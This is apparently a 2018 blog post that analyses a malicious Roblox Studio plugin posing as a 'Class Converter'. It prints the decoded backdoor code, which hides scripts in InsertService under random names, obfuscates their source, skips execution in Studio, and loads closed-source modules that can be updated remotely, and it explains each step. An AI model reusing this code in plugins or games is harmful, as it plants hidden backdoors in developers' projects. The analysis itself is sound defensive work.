# Decoding a malicious Roblox plugin
## 19/12/2018 - [theLMGN](https://thelmgn.com)

So, recently I found [this](https://www.roblox.com/library/2644964449/Class-Converter), it looked pretty useful as a thing. But I'd heard as of viruses being spread as Roblox plugins, so I decided to crack it open and download the original source code. (grab the plugin id and then go to https://roblox.com/asset?id={pluginid}, rename that to a RBXL file and open in Studio)

![image](https://lmgn.uk/WFZ0Ov.png)

There is nothing obvious in sight, however I decided to open the file named [`SET`](https://gist.github.com/theLMGN/c206dc874ed858be19ca009fae5219e1#file-set-lua), It was some strange LUA opcode alien script. I printed the data with the built in Roblox console, but however all I managed to extract from this was the word "LuaQ", Googled this and saw that it was LuaC, I created a small Node.JS script to convert this into an actual LuaC file, not just ASCII codes. [You can see the converted LuaC in the same Gist](https://gist.github.com/theLMGN/c206dc874ed858be19ca009fae5219e1#file-set-luac), It appeared to be actual, readable code. It had some wierd strings, and something called a "bphide" parented to the InsertService, this 100% is a trick to hide the scripts inside, due to the user not being able to see the InsertService in normal Studio usage, and is still pushed to Roblox servers. In the code there is also the name of a Roblox user NotAshley, I sent them a Roblox PM about this

![image](https://lmgn.uk/wjExdH.png)

Interestingly, a name of a group called "Fyre_Studios", I haven't found out what this is, any info, message me. The script is just another LuaC decoder, just with more interesting things.

## Alright, lets get to the meat of the virus


```lua
	bphide = Instance.new("Backpack", game:GetService("InsertService"))
bphide.Name = math.random(3, 5) .. rndname[math.random(#rndname)] .. math.random(1, 30000) .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)]
scrip = Instance.new("Script", bphide)
scripobfrequire = math.random(1, 400000)
scriptreqcode = 7.0493265740554e+18
scriptreqcode = (scriptreqcode + scripobfrequire) ^ 2
scrip.Source = "\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\103\97\109\101\58\87\97\105\116\70\111\114\67\104\105\108\100\40\39\92\56\51\92\49\48\49\92\49\49\52\92\49\49\56\92\49\48\49\92\49\49\52\92\56\51\92\57\57\92\49\49\52\92\49\48\53\92\49\49\50\92\49\49\54\92\56\51\92\49\48\49\92\49\49\52\92\49\49\56\92\49\48\53\92\57\57\92\49\48\49\39\41\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\92\56\55\92\49\49\49\92\49\49\52\92\49\48\55\92\49\49\53\92\49\49\50\92\57\55\92\57\57\92\49\48\49\39\41\46\84\101\114\114\97\105\110\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\39\92\54\55\92\57\55\92\49\48\56\92\49\48\56\92\55\48\39\41\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\59\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\92\56\50\92\49\49\55\92\49\49\48\92\56\51\92\49\48\49\92\49\49\52\92\49\49\56\92\49\48\53\92\57\57\92\49\48\49\39\41\58\73\115\83\116\117\100\105\111\40\41\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\59\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\114\101\113\117\105\114\101\40\109\97\116\104\46\115\113\114\116\40\109\97\116\104\46\115\113\114\116\40" .. scriptreqcode .. "\41\32\45\32" .. scripobfrequire .. ")).load(game.PlaceId)end)end)"
scrip.Disabled = false
scrip.Name = math.random(3, 5) .. rndname[math.random(#rndname)] .. math.random(1, 30000) .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)]

extr = Instance.new("Script", bphide)
extr.Source = "marketplaceService = game:GetService('MarketplaceService') productInfo = marketplaceService:GetProductInfo(2655062037) modulefunc = productInfo.Description modulefunc = tonumber(string.match(modulefunc, '%d+')) require(modulefunc)[tostring(productInfo.Name)](game.PlaceId)"
extr.Disabled = false
extr.Name = math.random(3, 5) .. rndname[math.random(#rndname)] .. math.random(1, 30000) .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)]

pcall(function()
	bphide.Parent = game["\67\83\71\68\105\99\116\105\111\110\97\114\121\83\101\114\118\105\99\101"]
end)end

```

Let's analyze this in chunks shall we?

### Hiding our traces.

```lua
bphide = Instance.new("Backpack", game:GetService("InsertService"))
bphide.Name = math.random(3, 5) .. rndname[math.random(#rndname)] .. math.random(1, 30000) .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)]
```
This code snippet creates a hidden backpack element in the "InsertService", something that isn't shown to users.

### Injecting our virus
```lua
scrip = Instance.new("Script", bphide)
scripobfrequire = math.random(1, 400000)
scriptreqcode = 7.0493265740554e+18
scriptreqcode = (scriptreqcode + scripobfrequire) ^ 2
scrip.Source = "spawn(function()game:WaitForChild('ServerScriptService')if game:GetService('Workspace').Terrain:FindFirstChild('CallF')then return end;if game:GetService('RunService'):IsStudio()then return end;pcall(function()require(math.sqrt(math.sqrt(" .. scriptreqcode .. ") - " .. scripobfrequire .. ")).load(game.PlaceId)end)end)"
scrip.Disabled = false
scrip.Name = math.random(3, 5) .. rndname[math.random(#rndname)] .. math.random(1, 30000) .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)]
```
This creates a hidden script element, a random number between 1,400000 (for easiness sake, lets use 200000) and 7049326574055400000, adds them together and squares them.
The `scrip.source` is really what we're looking for, it's obfuscated, so lets deobfuscate it shall we?

```lua
spawn(function()
	game:WaitForChild('ServerScriptService')
	if game:GetService('Workspace').Terrain:FindFirstChild('CallF') then
		return
	end
	if game:GetService('RunService'):IsStudio() then
		return 
	end
	pcall(function()
		require(math.sqrt(math.sqrt(scriptreqcode) - scripobfrequire)).load(game.PlaceId)
	end)
end)
```

The first line is just waiting for the game to be loaded. The next 6 are just stopping if there is something called `CallF` in the game's Terrain object and stopping the script if it's running in Roblox Studio (to prevent "Cannot find module ID" errors blowing our cover since closed source modules can't be downloaded in Studio)

It's the next 3 lines that really peak my interest. `pcall` is just Lua's version of a `try catch` block. The mathsie bit doesn't really need explaining so, it just returns the square root fo our `7.0493265740554e+18`, which is 2655056793, which is of course a closed source module, hurray! All for nothing! https://www.roblox.com/library/2655056793/Settings


### Loading a junk function
```lua
	extr = Instance.new("Script", bphide)
	extr.Source = "
		marketplaceService = game:GetService('MarketplaceService')
		productInfo = marketplaceService:GetProductInfo(2655062037)
		modulefunc = productInfo.Description
		modulefunc = tonumber(string.match(modulefunc, '%d+'))
		require(modulefunc)[tostring(productInfo.Name)](game.PlaceId)"
	extr.Disabled = false
	extr.Name = math.random(3, 5) .. rndname[math.random(#rndname)] .. math.random(1, 30000) .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)] .. rndname[math.random(#rndname)]
```

The module loaded at the end is just a junk module, however can be updated at any time to something more nefarious

```lua
local module = {}

module.none = function() -- This is the function that gets called by the code above
	return
end

module.testload = function()
	print("XD")
end

return module
```